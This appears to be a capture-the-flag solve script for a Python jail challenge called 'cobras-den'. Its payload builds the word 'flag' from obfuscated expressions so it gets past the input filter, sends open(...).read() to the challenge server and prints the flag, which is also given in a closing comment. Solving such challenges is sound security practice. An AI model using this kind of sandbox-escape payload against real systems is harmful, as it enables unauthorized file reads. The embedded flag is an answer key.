from pwn import remote

# flag stored at 'flag' in current dir

def make_num(num: int) -> str:
    assert num >= 1
    one = "~~([]<[[]])"
    return '+'.join(one for _ in range(num))


f = f'repr(ord)[{make_num(10)}]' # repr(ord)[10]
l = f'repr(ord)[{make_num(4)}]' # repr(ord)[4]
a = f'chr(ord(repr(ord)[{make_num(1)}])+~([]<[]))' # chr(ord('b')-1)
g = f'chr(ord({f})+{make_num(1)})'

print(f)
print(l)
print(a)
print(g)

print(len(f))
print(len(l))
print(len(a))
print(len(g))


final = f'open({f}+{l}+{a}+{g}).read()'

print(len(final))
print(final)


# call open(X).read() where X resolves to `flag`, can use chr()

r = remote('cobras-den.chal.irisc.tf', 10400)

r.sendlineafter(b'Input: ', final)


print(r.readline().strip())

# irisctf{pyth0n_has_s(+([]<[]))me_whacky_sh(+([]<[[]]))t}
